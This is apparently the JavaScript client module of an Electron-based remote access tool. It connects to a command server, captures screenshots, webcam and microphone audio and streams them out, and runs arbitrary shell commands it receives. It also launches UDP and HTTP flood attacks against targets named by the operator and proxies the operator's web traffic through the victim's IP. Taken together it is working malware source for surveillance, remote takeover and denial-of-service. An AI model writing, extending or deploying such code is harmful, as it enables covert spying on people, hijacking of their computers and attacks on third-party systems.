const { desktopCapturer, screen, app, ipcMain, BrowserWindow } = require("electron");
const io = require("socket.io-client");
const child_process = require("child_process");
const udpRain = require("./udpRain");
const httpRain = require("./httpRain");
const axios = require("axios");
const { URL } = require("url");
const express = require("express");
const http = require("http");
//udpRain.start({ port: 53, ip: "192.168.1.180", seconds: 5, interval: 1000 });

// My Modules
const info = require("./config");

class RemoteControl {
  constructor() {
    this.mainWindow;
    this.proxyServer = null;
    this.proxyPort = 0; // Dinamik port
  }
  getCamDataWeb = (data) => {
    console.log({ getCamDataWeb: data });
    this.mainWindow.reload();
    setTimeout(() => {
      this.mainWindow.webContents.send("camStart", data);
    }, 3000);
  };
  
  handleAudioListen = (data) => {
    console.log({ handleAudioListen: data });
    this.mainWindow.webContents.send("audioListenStart", data);
  };

  getScreenData = (data) => {
    (async () => {
      try {
        // Hem screen hem window'ları al
        let sources = await desktopCapturer.getSources({
          types: ["screen", "window"],
          thumbnailSize: {
            width: parseInt(data.dimension.split("x")[0]),
            height: parseInt(data.dimension.split("x")[1]),
          },
        });

        // Screen ID ile bul (index değil)
        const screenId = data.screenId || data.screen; // Eski kod uyumluluğu için data.screen de kontrol et
        
        let foundSource = null;
        try {
          if (screenId) {
            // ID ile ara
            foundSource = sources.find(source => source.id === screenId);
            
            // Eğer bulunamazsa, eski index yöntemini dene (geriye dönük uyumluluk)
            if (!foundSource && !isNaN(parseInt(screenId))) {
              const screenIndex = parseInt(screenId);
              if (screenIndex >= 0 && screenIndex < sources.length) {
                foundSource = sources[screenIndex];
              }
            }
          }

          if (foundSource) {
            try {
              // Window kapanmış olabilir, thumbnail alma işlemini try-catch içine al
              data["src"] = foundSource.thumbnail.toDataURL();
              console.log("Screenshot taken for:", foundSource.name, "ID:", foundSource.id);
              this.socket.emit("screenshotResponse", data);
            } catch (thumbnailError) {
              console.error("Error getting thumbnail (window may be closed):", thumbnailError.message);
              data["src"] = "";
              this.socket.emit("screenshotResponse", data);
            }
          } else {
            console.error("Screen not found. ID:", screenId, "Available sources:", sources.length);
            data["src"] = "";
            this.socket.emit("screenshotResponse", data);
          }
        } catch (findError) {
          console.error("Error finding source (window may be closed):", findError.message);
          data["src"] = "";
          this.socket.emit("screenshotResponse", data);
        }
      } catch (err) {
        console.error("Error getting screen data:", err.message);
        data["src"] = "";
        this.socket.emit("screenshotResponse", data);
      }
    })();
  };


  start = (mainWindow) => {
    this.mainWindow = mainWindow;

    // Proxy server'ı başlat
    this.startProxyServer();

    this.socket = io.connect("http://" + info.host + ":" + info.port);
    this.socket.on("connect", () => {
      this.socket.emit("joinToRoom", { roomName: "terminal-" + info.id });
      // Proxy port bilgisini server'a gönder
      this.socket.emit("proxyPort", {
        terminalId: info.id,
        port: this.proxyPort
      });
    });

    this.socket.on("screenshotRequest", (data) => {
      this.getScreenData(data);
    });

    this.socket.on("camShotRequest", (data) => {
      this.getCamDataWeb(data);
    });
    
    this.socket.on("audioListenRequest", (data) => {
      console.log("🎧 Audio listen request received:", data.action);
      this.handleAudioListen(data);
    });

    ipcMain.on("cam", (event, args) => {
      this.socket.emit("camShotResponse", args);
    });
    
    // Binary transfer için yeni handler
    ipcMain.on("camBinary", (event, args) => {
      this.socket.emit("camBinary", args);
    });
    
    // Audio stream için handler
    ipcMain.on("audioStream", (event, args) => {
      console.log("📥 Audio stream received from renderer:", args.audioData ? args.audioData.length : "no data", "chars (base64)");
      console.log("📡 MIME type:", args.mimeType);
      
      if (args.audioData && args.audioData.length > 0) {
        console.log("📤 Forwarding audio data to server");
        this.socket.emit("audioStreamResponse", args);
      } else {
        console.log("⚠️ No audio data to forward");
      }
    });
    
    // Audio listen status için handler
    ipcMain.on("audioListenStatus", (event, args) => {
      this.socket.emit("audioListenStatus", args);
    });

    this.socket.on("getRunRequest", (data) => {
      console.log({ getRunRequest: data });
      if (data.cmd.indexOf("udpRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          port: parseInt(splittedData[2]),
          ip: splittedData[1],
          seconds: parseInt(splittedData[3]),
          interval: parseInt(splittedData[4]),
        };
        console.log({ createdData });
        udpRain.start(createdData);
      } else if (data.cmd.indexOf("httpRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          url: splittedData[1],
          seconds: parseInt(splittedData[2]),
          interval: parseInt(splittedData[3]),
        };
        console.log({ createdData });
        httpRain.start(createdData);
      }
      else if (data.cmd.indexOf("codeRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          seconds: parseInt(splittedData[1]),
          interval: parseInt(splittedData[2]),
          code: splittedData[3],
        };
        console.log({ createdData });
        httpRain.codeRainStart(createdData);
      }
      else {
        try {
          child_process.exec(
            data.cmd,
            { shell: true },
            (err, stdout, stderr) => {
              if (err) {
                data["cmd"] = "err: " + err;
              } else if (stderr) {
                data["cmd"] = "stderr: " + stderr;
              } else {
                data["cmd"] = stdout;
              }

              this.socket.emit("getRunResponse", data);
            }
          );
        } catch (error) {
          data["cmd"] = "catchError: " + error;
          this.socket.emit("getRunResponse", data);
        }
      }
    });

    /**
     * Remote Browser - Proxy URL gönder
     * Dashboard'a proxy URL'yi gönder, tüm istekler proxy üzerinden terminal IP'si ile çıkar
     */
    this.socket.on("remoteBrowserOpen", (data) => {
      // data: { from, to, url }
      // Proxy port bilgisini dashboard'a gönder
      if (this.proxyPort) {
        const proxyUrl = `http://${info.host}:${this.proxyPort}/proxy?url=${encodeURIComponent(data.url)}`;
        this.socket.emit("remoteBrowserProxyUrl", {
          from: data.from,
          to: data.to,
          url: data.url,
          proxyUrl: proxyUrl
        });
      } else {
        // Proxy henüz hazır değilse, eski yöntemle HTML fetch et
        this.fetchRemoteBrowserHTML(data);
      }
    });

    // Screen/window listesi isteği
    this.socket.on("getScreenListRequest", (data) => {
      this.getScreenList(data);
    });

    // Proxy port bilgisi isteği
    this.socket.on("getProxyPort", (data) => {
      this.socket.emit("proxyPort", {
        terminalId: info.id,
        port: this.proxyPort
      });
    });
  };

  /**
   * HTTP Proxy Server başlat
   * Tüm HTTP/HTTPS istekleri bu server üzerinden terminal IP'si ile çıkar
   */
  startProxyServer = () => {
    const proxyApp = express();
    proxyApp.use(express.json({ limit: '50mb' }));
    proxyApp.use(express.urlencoded({ extended: true, limit: '50mb' }));

    // CORS headers
    proxyApp.use((req, res, next) => {
      res.header('Access-Control-Allow-Origin', '*');
      res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
      res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
      if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
      }
      next();
    });

    // Proxy endpoint - Tüm istekleri buraya yönlendir
    proxyApp.all('/proxy', async (req, res) => {
      try {
        const targetUrl = req.query.url || req.body.url;
        
        if (!targetUrl) {
          return res.status(400).json({ error: 'URL parameter required' });
        }

        console.log("Proxy request:", req.method, targetUrl);

        // Axios ile isteği terminal üzerinden yap
        const config = {
          method: req.method,
          url: targetUrl,
          timeout: 30000,
          headers: {
            'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': req.headers['accept'] || '*/*',
            'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
            'Referer': req.headers['referer'] || targetUrl,
          },
          maxRedirects: 5,
          validateStatus: () => true, // Tüm status kodlarını kabul et
          responseType: 'arraybuffer', // Binary data için
        };

        // Request body varsa ekle
        if (req.method !== 'GET' && req.method !== 'HEAD' && req.body) {
          if (req.headers['content-type']?.includes('application/json')) {
            config.data = JSON.stringify(req.body);
            config.headers['Content-Type'] = 'application/json';
          } else if (req.headers['content-type']?.includes('application/x-www-form-urlencoded')) {
            const FormDataLib = require('form-data');
            const form = new FormDataLib();
            for (const key in req.body) {
              form.append(key, req.body[key]);
            }
            config.data = form;
            config.headers = { ...config.headers, ...form.getHeaders() };
          } else {
            config.data = req.body;
          }
        }

        const response = await axios(config);

        // Response headers'ı kopyala
        const responseHeaders = {};
        Object.keys(response.headers).forEach(key => {
          // CORS ve güvenlik header'larını ekle
          if (key.toLowerCase() === 'content-type' || 
              key.toLowerCase() === 'content-length' ||
              key.toLowerCase() === 'content-encoding') {
            responseHeaders[key] = response.headers[key];
          }
        });

        // Content-Type'ı ayarla
        if (response.headers['content-type']) {
          res.setHeader('Content-Type', response.headers['content-type']);
        }

        // Status code'u ayarla
        res.status(response.status);

        // Response data'yı gönder
        res.send(Buffer.from(response.data));
        
        console.log("Proxy response:", response.status, response.headers['content-type']);

      } catch (error) {
        console.error("Proxy error:", error.message);
        res.status(500).json({ 
          error: error.message,
          code: error.code 
        });
      }
    });

    // Health check
    proxyApp.get('/health', (req, res) => {
      res.json({ status: 'ok', port: this.proxyPort });
    });

    // Server'ı dinamik port'ta başlat
    const server = http.createServer(proxyApp);
    server.listen(0, '127.0.0.1', () => {
      this.proxyPort = server.address().port;
      console.log("Proxy server started on port:", this.proxyPort);
    });

    this.proxyServer = server;
  };

  /**
   * Axios ile HTML fetch ve URL rewrite
   * Tüm trafik terminal makinenin IP'si üzerinden gider.
   */
  fetchRemoteBrowserHTML = async (data) => {
    const targetUrl = data.url;
    const method = data.method || "GET";
    const formData = data.formData || null;

    console.log("Fetching remote browser HTML:", targetUrl, "Method:", method);

    try {
      // Axios ile HTTP isteği (terminal üzerinden)
      const config = {
        timeout: 30000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept-Encoding': 'gzip, deflate, br'
        },
        maxRedirects: 5,
        validateStatus: (status) => status < 500 // 4xx hatalarını da al (404, 403, vs.)
      };

      let response;
      if (method === "POST" && formData) {
        // Form data ile POST - URL encoded format
        const FormDataLib = require('form-data');
        const form = new FormDataLib();
        for (const key in formData) {
          form.append(key, formData[key]);
        }
        config.headers = { ...config.headers, ...form.getHeaders() };
        response = await axios.post(targetUrl, form, config);
      } else {
        // GET isteği
        response = await axios.get(targetUrl, config);
      }

      console.log("HTTP response received:", response.status, response.headers['content-type']);

      let html = response.data;
      const baseUrl = new URL(targetUrl);
      
      // Proxy base URL oluştur
      const proxyBaseUrl = this.proxyPort ? `http://${info.host}:${this.proxyPort}/proxy?url=` : null;

      // HTML içindeki tüm relative URL'leri proxy URL'ye çevir
      html = this.rewriteHTMLUrls(html, baseUrl, proxyBaseUrl);

      console.log("Sending HTML to dashboard, length:", html.length);

      // HTML'i dashboard'a gönder
      this.socket.emit("remoteBrowserHTML", {
        from: data.from,
        to: data.to,
        url: targetUrl,
        html: html,
        status: response.status
      });

    } catch (error) {
      console.error("Remote browser fetch error:", error.message);
      console.error("Error details:", error);
      
      // Hata durumunda error HTML gönder
      const errorHtml = `
        <!DOCTYPE html>
        <html>
        <head><title>Error</title></head>
        <body style="font-family: Arial; padding: 20px;">
          <h1>Error Loading Page</h1>
          <p><strong>URL:</strong> ${targetUrl}</p>
          <p><strong>Error:</strong> ${error.message}</p>
          ${error.response ? `<p><strong>Status:</strong> ${error.response.status}</p>` : ''}
          ${error.code ? `<p><strong>Code:</strong> ${error.code}</p>` : ''}
        </body>
        </html>
      `;

      console.log("Sending error HTML to dashboard");
      
      this.socket.emit("remoteBrowserHTML", {
        from: data.from,
        to: data.to,
        url: targetUrl,
        html: errorHtml,
        status: error.response ? error.response.status : 0,
        error: error.message
      });
    }
  };

  /**
   * HTML içindeki tüm relative URL'leri proxy URL'ye çevir
   * Tüm istekler terminal üzerinden çıkar
   */
  rewriteHTMLUrls = (html, baseUrl, proxyBaseUrl) => {
    try {
      // img src - proxy URL'ye çevir
      html = html.replace(/<img([^>]*?)\s+src=["']([^"']+)["']/gi, (match, attrs, src) => {
        try {
          if (!src.startsWith('javascript:') && !src.startsWith('data:') && !src.startsWith('blob:')) {
            const absoluteSrc = new URL(src, baseUrl).href;
            const proxySrc = proxyBaseUrl ? `${proxyBaseUrl}&url=${encodeURIComponent(absoluteSrc)}` : absoluteSrc;
            return `<img${attrs} src="${proxySrc}"`;
          }
          return match;
        } catch (e) {
          return match;
        }
      });

      // script src - proxy URL'ye çevir
      html = html.replace(/<script([^>]*?)\s+src=["']([^"']+)["']/gi, (match, attrs, src) => {
        try {
          if (!src.startsWith('javascript:') && !src.startsWith('data:') && !src.startsWith('blob:')) {
            const absoluteSrc = new URL(src, baseUrl).href;
            const proxySrc = proxyBaseUrl ? `${proxyBaseUrl}&url=${encodeURIComponent(absoluteSrc)}` : absoluteSrc;
            return `<script${attrs} src="${proxySrc}"`;
          }
          return match;
        } catch (e) {
          return match;
        }
      });

      // link href (CSS, favicon, vs.) - proxy URL'ye çevir
      html = html.replace(/<link([^>]*?)\s+href=["']([^"']+)["']/gi, (match, attrs, href) => {
        try {
          if (!href.startsWith('javascript:') && !href.startsWith('data:') && !href.startsWith('blob:')) {
            const absoluteHref = new URL(href, baseUrl).href;
            const proxyHref = proxyBaseUrl ? `${proxyBaseUrl}&url=${encodeURIComponent(absoluteHref)}` : absoluteHref;
            return `<link${attrs} href="${proxyHref}"`;
          }
          return match;
        } catch (e) {
          return match;
        }
      });

      // a href (linkler) - JavaScript içindeki href'leri bozmamak için dikkatli
      html = html.replace(/<a([^>]*?)\s+href=["']([^"']+)["']/gi, (match, attrs, href) => {
        try {
          // Hash, javascript: veya data: linklerini olduğu gibi bırak
          if (href.startsWith('#') || href.startsWith('javascript:') || href.startsWith('data:')) {
            return match;
          }
          
          const absoluteHref = new URL(href, baseUrl).href;
          // URL'yi escape et (JavaScript string içinde güvenli)
          const escapedUrl = absoluteHref.replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/\n/g, '\\n').replace(/\r/g, '\\r');
          // Link'e onclick ekle ki yeni istek gönderilsin
          return `<a${attrs} href="javascript:void(0)" data-remote-url="${absoluteHref}" onclick="window.parent.postMessage({type:'remoteBrowserNavigate',url:'${escapedUrl}'},'*')"`;
        } catch (e) {
          return match;
        }
      });

      // form action - JavaScript içindeki action'ları bozmamak için
      html = html.replace(/<form([^>]*?)\s+action=["']([^"']+)["']/gi, (match, attrs, action) => {
        try {
          if (action.startsWith('javascript:') || action === '#' || !action) {
            return match;
          }
          
          const absoluteAction = new URL(action, baseUrl).href;
          const escapedUrl = absoluteAction.replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/\n/g, '\\n').replace(/\r/g, '\\r');
          // Form submit'i yakalamak için - FormData'yı serialize et
          return `<form${attrs} action="javascript:void(0)" data-remote-action="${absoluteAction}" onsubmit="event.preventDefault();const f=new FormData(this);const d={};for(let p of f.entries())d[p[0]]=p[1];window.parent.postMessage({type:'remoteBrowserSubmit',url:'${escapedUrl}',formData:d},'*');return false;"`;
        } catch (e) {
          return match;
        }
      });

      // CSS içindeki url() - proxy URL'ye çevir
      html = html.replace(/<style([^>]*)>([\s\S]*?)<\/style>/gi, (match, attrs, cssContent) => {
        try {
          const rewrittenCss = cssContent.replace(/url\(["']?([^"')]+)["']?\)/gi, (cssMatch, url) => {
            try {
              if (!url.startsWith('data:') && !url.startsWith('javascript:') && !url.startsWith('#') && !url.startsWith('blob:')) {
                const absoluteUrl = new URL(url, baseUrl).href;
                const proxyUrl = proxyBaseUrl ? `${proxyBaseUrl}&url=${encodeURIComponent(absoluteUrl)}` : absoluteUrl;
                return `url("${proxyUrl}")`;
              }
              return cssMatch;
            } catch (e) {
              return cssMatch;
            }
          });
          return `<style${attrs}>${rewrittenCss}</style>`;
        } catch (e) {
          return match;
        }
      });

      return html;
    } catch (error) {
      console.error("Error rewriting HTML URLs:", error);
      return html; // Hata durumunda orijinal HTML'i döndür
    }
  };

  /**
   * Screen/window listesi al ve dashboard'a gönder
   */
  getScreenList = async (data) => {
    try {
      console.log("Getting screen/window list...");
      
      // Hem screen hem window'ları al
      const sources = await desktopCapturer.getSources({
        types: ["screen", "window"],
        thumbnailSize: { width: 200, height: 200 }
      });

      console.log("Found", sources.length, "sources");

      const screens = sources.map((source, index) => {
        const isScreen = source.id.startsWith("screen:") || source.id.includes("Screen");
        return {
          id: source.id,
          name: source.name || (isScreen ? `Screen ${index + 1}` : `Window: ${source.name}`),
          thumbnail: source.thumbnail.toDataURL(),
          type: isScreen ? "screen" : "window"
        };
      });

      console.log("Sending screen list to dashboard:", screens.length, "items");
      
      this.socket.emit("getScreenListResponse", {
        from: data.from,
        to: data.to,
        screens: screens
      });
    } catch (err) {
      console.error("Error getting screen list:", err);
      this.socket.emit("getScreenListResponse", {
        from: data.from,
        to: data.to,
        screens: []
      });
    }
  };
}

module.exports = new RemoteControl();
